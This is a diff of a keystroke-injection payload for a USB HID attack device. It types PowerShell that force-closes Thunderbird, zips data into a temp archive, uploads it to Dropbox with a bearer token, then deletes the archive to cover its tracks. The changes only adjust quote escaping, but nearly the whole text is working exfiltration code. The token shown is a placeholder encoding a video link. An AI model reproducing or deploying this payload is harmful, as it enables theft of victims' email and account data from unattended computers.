@@ -14,7 +14,7 @@ ATTACKMODE HID
 ARCHIVE_NAME="cache.zip"
 ACCESS_TOKEN="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1Sdlk1cGxvbzFPSQ=="
 DROPBOX_FOLDER_PATH="/"
-DROPBOX_CONST_LINK ="https://content.dropboxapi.com/2/files/upload"
+DROPBOX_CONST_LINK="https://content.dropboxapi.com/2/files/upload"
 
 * REM Opening Thunderbird settings
 QUACK DELAY 1500
@@ -78,7 +78,7 @@ QUACK DELAY 1500
 QUACK STRING cd $env:TEMP
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING Stop-Process -Name "thunderbird" -Force
+QUACK STRING Stop-Process -Name \"thunderbird\" -Force
 QUACK ENTER
 QUACK DELAY 500
 QUACK STRING Compress-Archive -LiteralPath 
@@ -90,16 +90,16 @@ QUACK ENTER
 QUACK DELAY 1000
 
 * REM Exfiltration via Dropbox
-QUACK STRING $filePath = "$env:TEMP/$ARCHIVE_NAME"
+QUACK STRING $filePath = \"$env:TEMP/$ARCHIVE_NAME\"
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $filePath = $filePath -replace "\\", "/"
+QUACK STRING $filePath = $filePath -replace \"\\\", \"/\"
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $dropboxPath = "$DROPBOX_FOLDER_PATH$ARCHIVE_NAME"
+QUACK STRING $dropboxPath = \"$DROPBOX_FOLDER_PATH$ARCHIVE_NAME\"
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $accessToken = "$ACCESS_TOKEN"
+QUACK STRING $accessToken = \"$ACCESS_TOKEN\"
 QUACK ENTER
 QUACK DELAY 500
 QUACK STRING $fileContent = [System.IO.File]::ReadAllBytes($filePath)
@@ -108,17 +108,17 @@ QUACK DELAY 500
 QUACK STRING $headers = @{
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING "Authorization" = "Bearer $accessToken"
+QUACK STRING \"Authorization\" = \"Bearer $accessToken\"
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING "Dropbox-API-Arg" = ("{`"path`": `"" + $dropboxPath + "`", `"mode`": `"add`", `"autorename`": true, `"mute`": false}")
+QUACK STRING \"Dropbox-API-Arg\" = (\"{`\"path`\": `\"\" + $dropboxPath + \"`\", `\"mode`\": `\"add`\", `\"autorename`\": true, `\"mute`\": false}\")
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING "Content-Type" = "application/octet-stream"
+QUACK STRING \"Content-Type\" = \"application/octet-stream\"
 QUACK ENTER
 QUACK DELAY 500
 QUACK STRING }
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING Invoke-RestMethod -Uri "$DROPBOX_CONST_LINK" -Method Post -Headers $headers -Body $fileContent; rm $filePath; exit
+QUACK STRING Invoke-RestMethod -Uri \"$DROPBOX_CONST_LINK\" -Method Post -Headers $headers -Body $fileContent; rm $filePath; exit
 QUACK ENTER
